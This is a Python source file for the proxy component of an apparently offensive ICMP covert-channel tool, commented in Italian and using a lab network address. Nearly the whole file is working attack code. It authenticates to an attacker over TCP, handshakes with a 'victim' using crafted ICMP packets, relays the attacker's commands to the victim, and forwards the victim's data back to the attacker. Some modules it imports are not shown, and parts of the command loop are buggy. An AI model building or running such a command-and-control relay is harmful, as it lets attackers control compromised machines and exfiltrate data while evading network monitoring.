#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json
import type_singleton as singleton
import socket

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 

file_path = "./attacksingleton.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import attacksingleton 


def find_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print(localIP:=s.getsockname()[0])
    s.close()
    return localIP

#------------------------------------
def callback_wait_data_from_vicitm(event_pktconn:threading.Event, data_lock:threading.Lock, data_received:list=[]): 
    def callback(packet):
        print(f"callback wait_data_from_vicitm received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            checksum=mymethods.calc_checksum(packet[Raw].load)
            #print(f"Payload received:\t{packet[Raw].load}")
            #print(f"ID ICMP {packet[ICMP].id} e checksum {checksum} combaciano?{packet[ICMP].id==checksum}")
            if packet[ICMP].id==checksum: 
                update_data_received(
                    [packet[ICMP].id,packet[ICMP].seq,packet[Raw].load]
                    ,data_lock
                    ,data_received
                )
                if com.LAST_PACKET.encode() in packet[Raw].load:
                    #print(f"The packet contains {com.LAST_PACKET}\t{packet[Raw].load}")
                    com.set_threading_Event(event_pktconn) 
    return callback 
    
def callback_wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address=None, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None, event_pktconn:threading.Event=None): 
    def callback(packet):
        print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
            #print(f"Ricevuto pacchetto da {packet[IP].src}...")
            confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
            check_sum=mymethods.calc_checksum(confirm_text.encode()) 
            if check_sum==packet[ICMP].id and ip_vittima.compressed==packet[IP].src: 
                print(f"Il pacchetto ha confermato la connessione...") 
                com.set_threading_Event(event_pktconn) 
                return
        print(f"Il pacchetto non ha confermato la connessione...")
    return callback 

def redirect_command_to_victim(command_to_redirect:str, ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address, attack_function:str):
    if not com.is_string(command_to_redirect) or not com.is_IPAddress(ip_vittima) or not com.is_string(attack_function):
        raise Exception("Argomenti non validi") 
    if attacksingleton.send_data(attack_function, command_to_redirect.encode(), ip_vittima):
        print("Command redirected")
    else: print("Command not redirected")

def old_redirect_command_to_victim(command_to_redirect:str, ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address, ):
    if not isinstance(command_to_redirect, str):
        raise Exception(f"Il comando non è una stringa")
    if not isinstance(ip_vittima, ipaddress.IPv4Address) and not isinstance(ip_vittima, ipaddress.IPv6Address):
        raise Exception(f"IP attaccante non è istanza di IPv4Address ne di IPv6Address")
    print(f"Sendin command {command_to_redirect} to {ip_vittima}") 
    if com.send_packet(command_to_redirect.encode(),ip_vittima):
        print(f"la vittima ha ricevuto il comando")
        return True
    print(f"la vittima non ha ricevuto il comando")
    return False 

#--------------------------------
def update_data_received(data, data_lock:threading.Lock, data_received):
    data_lock.acquire()
    data_received.append(data)
    data_lock.release() 

def update_victim_end_communication(ip_vittima):
    try:
        com.is_valid_ipaddress(ip_vittima)
    except Exception as e:
        raise Exception(f"update_victim_end_communication: {e}")
    data=com.END_COMMUNICATION
    if com.send_packet(data.encode(),ip_vittima):
        print(f"{ip_vittima}: la vittima è stata aggiornata")
        return
    print(f"{ip_vittima}: la vittima non è stata aggiornata")

def wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, thread_lock:threading.Lock, thread_response:dict[str, bool]):
        #print("\n(─‿─)\twait_conn_from_victim\n")
        try:
            confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
            checksum=mymethods.calc_checksum(confirm_text.encode())
            interface,_=mymethods.iface_src_from_IP(ip_vittima)
            event_pktconn=com.get_threading_Event()
            filter=singleton.AttackType().get_filter_connection_from_function(
                "wait_conn_from_victim"
                ,ip_vittima
                ,checksum
            ) 
        except Exception as e:
            print(f"wait_conn_from_victim filter: {e}")
            return False

        try:
            args={
                "filter":filter
                ,"count":1 
                ,"prn":callback_wait_conn_from_victim(
                    ip_vittima
                    ,ip_host
                    ,event_pktconn
                )
                #,"store":True 
                ,"iface":interface
            } 
            sniffer,pkt_timer=com.sniff_packet(args,event=event_pktconn) 
            com.wait_threading_Event(event_pktconn)
        except Exception as e:
            raise Exception(f"wait_conn_from_victim sniffer: {e}") 
        if res:=com.stop_timer(pkt_timer): 
            print(f"La connessione per {ip_vittima} è confermata")  
        else: 
            print(f"La connessione per {ip_vittima} non è confermata") 
        com.update_thread_response(
            ip_host
            ,thread_lock
            ,thread_response
            ,res
        )
        return res

def confirm_conn_to_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, socket_attacker:socket.socket, thread_lock:threading.Lock, thread_response:dict[str, bool], result:bool):
        try:
            thread_lock.acquire()  
            thread_lock.release()
            data=com.CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed+str(result)
            socket_attacker.sendall(data.encode()) 
            print(f"Aggiornamento confermato all'attaccante")
            if not result:
                socket_attacker.close()
                raise Exception(f"Il proxy {ip_host} non è connesso alla vittima {ip_vittima}") 
            print(f"\t***{ip_host} è connesso a {ip_vittima}")  
        except Exception as e: 
            print(f"confirm_conn_to_victim: {e}")
            exit(1)

def old_wait_data_from_vicitm(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, attack_function):
        print(f"Aspetto i dati da {ip_vittima}")
        try:
            event_pktconn=com.get_threading_Event()
            interface,_=mymethods.iface_src_from_IP(ip_vittima)
            filter=singleton.AttackType().get_filter_connection_from_function(
                "wait_data_from_vicitm"
                ,ip_src=ip_vittima
                ,ip_dst=ip_host
            )
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")

        #args={
        #    "filter":filter
        #    #,"count":1 
        #    ,"prn":callback_wait_data_from_vicitm(self.event_pktconn, self.data_lock, self.data_received)
        #    #,"store":True 
        #    ,"iface":interface
        #}

        try: 
            #self.sniffer, self.timeout_timer=com.sniff_packet(args,event=self.event_pktconn, timeout_time=None) 
            #com.wait_threading_Event(self.event_pktconn) 
            information_data=[]
            print("ABCDEFG function: ",attack_function)
            attacksingleton.wait_data(attack_function, ip_vittima, information_data) 
            print("End DATA: ",information_data)
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")
        
        #com.stop_sinffer(self.sniffer)
        #if com.stop_timer(self.timeout_timer): 
        #    print(f"Proxy: {self.ip_vittima} ha mandato i dati") 
        #    return True
        #print(f"Proxy: {self.ip_vittima} non ha mandato i dati") 
        #return False

def wait_data_from_vicitm(ip_vittima:ipaddress.IPv4Address, attack_function, data_received:list): 
        try: 
            other_data=[]
            print(f"Tramite l'attacco {attack_function} aspetto che {ip_vittima} mandi i dati")   
            attacksingleton.wait_data(attack_function, ip_vittima, data_received)  
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")  






#--------------------------------
def setup_thread(callback_function=None,ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None): 
    try: 
        #com.is_callback_function(callback_function)
        if not com.is_IPAddress(ip_host):
            raise Exception("ip_host non è ne un IPv4Address ne un IPv6Address")
        if not com.is_callback_function(callback_function):
            raise ValueError("La callback function passata non è chiamabile")  
    except Exception as e:
        raise Exception(f"setup_thread: {e}")
   
    thread_lock=threading.Lock()
    print(f"Lock creato:\t{thread_lock}") 
    thread_response={ip_host.compressed:False}
    print(f"Risposte create:\t{thread_response}")
    thread_dict={ip_host.compressed:threading.Thread( target=callback_function)}  
    print(f"Thread creato:\t{thread_dict}")
    return thread_lock, thread_response, thread_dict

def setup_server(ip_attaccante:ipaddress.IPv4Address|ipaddress.IPv6Address):
    if not isinstance(ip_attaccante, ipaddress.IPv4Address) and not isinstance(ip_attaccante, ipaddress.IPv6Address):
        raise Exception(f"IP attaccante non è istanza di IPv4Address ne di IPv6Address")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"Server listening: {s}")  
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        s.bind(("192.168.56.104", 4567))  #(socket.gethostname(), 4567)
        s.listen(1)
        socket_attacker, attacker_addr=s.accept()
        if ipaddress.ip_address(attacker_addr[0]).compressed != ip_attaccante.compressed:
            socket_attacker.close()
        else:
            #with self.socket_attacker:   
            data_received=socket_attacker.recv(1024).decode()
            if not data_received or com.CONFIRM_ATTACKER not in data_received:
                print(f"Invalid data from {attacker_addr}: {data_received}") 
                socket_attacker.close()  
                exit(0) 
    return data_received, socket_attacker

#-------------------------------- 
def check_value_in_parser(args):  
    if not isinstance(args,argparse.Namespace): 
        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
    if not isinstance(args.ip_attaccante,str): 
        raise Exception(f"--ip_attaccante non specificato: {args.ip_attaccante}")
    #if not isinstance(args.ip_vittima,str):  
    #    raise Exception(f"--ip_vittima non specificato: {args.ip_vittima}") 
    return True

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    #parser.add_argument("--ip_host",type=str, help="IP dell'host")
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
    #parser.add_argument("--ip_vittima",type=str, help="IP vittima")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}")

class Proxy:  
    def __init__(self): 
        try:
            if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
                raise ValueError("args non è istanza di argparse.Namespace")
            dict_values={
                "ip_attaccante":args.ip_attaccante  
            } 
            self.ip_attaccante=ipaddress.ip_address(dict_values.get("ip_attaccante") )
            print(f"IP attaccante: {type(self.ip_attaccante)} : {self.ip_attaccante}") 
            _,ip_host=mymethods.iface_src_from_IP(self.ip_attaccante)
            self.ip_host=ipaddress.ip_address(ip_host)
            print(f"IP host: {type(self.ip_host)} : {self.ip_host}")
            self.ip_vittima=None
            print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
            self.attack_function=None 
            print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
        except Exception as e: 
            print(f"_init_ setup args: {e}")
            exit(1)
        print("\n")
        self.connection_with_attacker()
        print("\n")
        self.connection_with_victim()
        print("\n")
        self.wait_command_from_attacker()
    
    def connection_with_attacker(self):
        #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6
        data_received, self.socket_attacker= setup_server(self.ip_attaccante) 
        data_received=data_received.split("||")
        print("Dati ricevuti: ", data_received)
        for data in data_received:
            if com.CONFIRM_ATTACKER in data:
                self.ip_vittima=ipaddress.ip_address(data.replace(com.CONFIRM_ATTACKER,""))
                print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
            elif com.ATTACK_FUNCTION in data:
                self.attack_function=data.replace(com.ATTACK_FUNCTION,"")
                print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
        data=com.CONFIRM_PROXY+self.ip_vittima.compressed+self.ip_host.compressed
        self.socket_attacker.sendall(data.encode()) 
        print("Socket con attaccante stabilito")
    
    def connection_with_victim(self):
        try: 
            self.thread_lock, self.thread_response, self.thread_dict=setup_thread(
                lambda: wait_conn_from_victim(self.ip_vittima, self.ip_host, self.thread_lock, self.thread_response) 
                ,self.ip_host
            )
            thread=self.thread_dict.get(self.ip_host.compressed)
            thread.start()  
            
            int_version,int_code=self.attack_function.replace("ipv","").split("_")
            XORversion= int.from_bytes("i".encode()) ^ int.from_bytes(int_version.encode())
            XORcode= int.from_bytes("p".encode()) ^ int.from_bytes(int_code.encode())
            icmp_id=(XORversion<<8)+XORcode
            #print(f"Int1:{int1}\tInt2:{int2}\tVersione:{int_version}\tCode:{int_code}") 
            #print(f"XORversion:{XORversion}\tXORcode:{XORcode}")
            #print(f"ICMPid:{icmp_id}")
            confirm_text=com.CONFIRM_PROXY+self.ip_vittima.compressed
            if com.send_packet(confirm_text.encode() , self.ip_vittima, icmp_id=icmp_id): 
                print(f"Reply: la vittima {self.ip_vittima} ha risposto") 
                result= True 
            else:
                print(f"No Reply: la vittima {self.ip_vittima} non ha risposto") 
                result= False 
            thread.join() 
            confirm_conn_to_victim(
                self.ip_vittima, self.ip_host, 
                self.socket_attacker, self.thread_lock, self.thread_response,
                self.thread_response.get(self.ip_host.compressed) and result
            )
            print("Stabilita connessione con la vittima ed attacccante aggiornato")
        except Exception as e: 
            print(f"connection_with_victim: {e}")
            exit(1) 
        
    def wait_command_from_attacker(self): 
        self.data_lock=threading.Lock()
        print("Waiting for the attacker's command")
        data_socket=self.socket_attacker.recv(1024).decode()  
        while data_socket and data_socket not in com.exit_cases and com.END_COMMUNICATION not in data_socket: 
            self.data_received=[] 
            thread_data=threading.Thread(
                target= lambda: wait_data_from_vicitm(self.ip_vittima, self.attack_function, self.data_received)
            )
            thread_data.start()
            #if comando is not None:
            #   data=com.CONFIRM_COMMAND+comando
            if com.CONFIRM_COMMAND in data_socket:   
                command= data_socket.replace(com.CONFIRM_COMMAND,"").strip()
                print(f"Il comando per la vittima è: {command}")
                if attacksingleton.send_data(self.attack_function, command.encode(), self.ip_vittima):
                    print("Command sent to victim")
                else: print("Couldn't send command to victim") 
            elif com.WAIT_DATA in command:
                print("Non ho il comando per la vittima. Dalla vittima aspetto i dati")
            else: 
                print(f"COMMAND: caso non contemplato {command}")
            if thread_data.ident is not None:
                thread_data.join()
            print(f"wait_command_from_attacker: End thread Data received: {self.data_received}")
            if len(self.data_received)<=0:
                print("si mandano i dati all'attaccante")
                self.socket_attacker.sendall(com.LAST_PACKET.encode()) 
            else:
                self.redirect_data_to_attacker()
            data_socket=self.socket_attacker.recv(1024).decode()
        print("Interruzione del programma")
        update_victim_end_communication(self.ip_vittima)
        self.socket_attacker.close()   

    def redirect_data_to_attacker(self): 
        print(f"data_received: {self.data_received}") 
        for data in self.data_received:
            print("Data: ",data)
            #id, seq, info= data
            #print(f"Data {id} / {seq} / {info}")
            #info= info.decode() if isinstance(info,bytes) else info  
            try: 
                self.socket_attacker.sendall(data.encode())
                #self.socket_attacker.sendall(
                #    (f"{id}\t{seq}\t{info}||").encode()
                #)
            except Exception as e:
                print(f"redirect_data_to_attacker: {e}")
        print(f"Dati mandati all'attaccante")



if __name__=="__main__":  
    Proxy()